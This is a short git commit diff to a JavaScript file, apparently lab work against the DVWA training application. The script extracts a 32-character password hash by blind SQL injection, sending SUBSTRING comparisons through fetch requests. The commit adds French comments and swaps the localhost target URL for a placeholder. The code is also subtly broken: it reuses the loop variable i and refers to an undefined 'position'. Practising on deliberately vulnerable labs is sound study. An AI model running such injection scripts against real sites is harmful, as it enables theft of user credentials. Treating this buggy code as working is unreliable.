11126490053415129710e74aaf5cf252e947e06b
972p <langloisnoah8@gmail.com>
2025-03-24 18:35:51 +0100

    Update injection.js

--- injection.js
+++ injection.js
@@ -1,13 +1,13 @@
 let lettersPwd = [];
 
 function injection(){
-     let i = 'abcdef0123456789';
+     let i = 'abcdef0123456789'; //on defini ici la chaine de caracteres
      i.split('').forEach((letter)=> {
         for(i=1; i<=32;i++) testLetter(letter, i);});
-};
+}; //ici on parcours donc cette chaine de caracteres, on passe 32 fois a chaque position(i).
 function testLetter (letter, i){
     let func = ("SUBSTRING(password" .concat(',',i,',1 ) = ', letter));
-    fetch(`http://localhost:8080/vulnerabilities/sqli_blind/?id=1%27+AND+${encodeURI(func)}&Submit=Submit#`).then((response) =>{
+    fetch(`Votre lien${encodeURI(func)}&Submit=Submit#`).then((response) =>{
         if (response.ok) lettersPwd[position-1] = letter;  // On récupère la lettre dans l'array
         if(lettersPwd.join('').length == 32) console.info(`Le mot de passe est :  ${lettersPwd.join('')}`);
     });
